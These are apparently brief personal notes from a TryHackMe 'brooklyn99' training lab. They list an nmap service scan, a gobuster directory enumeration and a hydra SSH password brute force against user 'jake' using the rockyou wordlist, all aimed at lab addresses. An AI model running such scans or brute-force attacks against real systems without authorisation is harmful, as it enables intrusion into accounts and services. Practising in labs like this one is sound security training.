Nmap scan
nmap -sV -sC -o nmap 10.10.85.80


Gobuster 
gobuster dir -e -u 10.10.243.102 -x php,txt,cgi,css,py,html -w /usr/share/dirb/wordlists/common.txt

Hydra Brute force
kali@kali:~/oscptraining/tryhackme/brooklyn99$ hydra 10.10.216.12 ssh -l jake -P /usr/share/wordlists/rockyou.txt


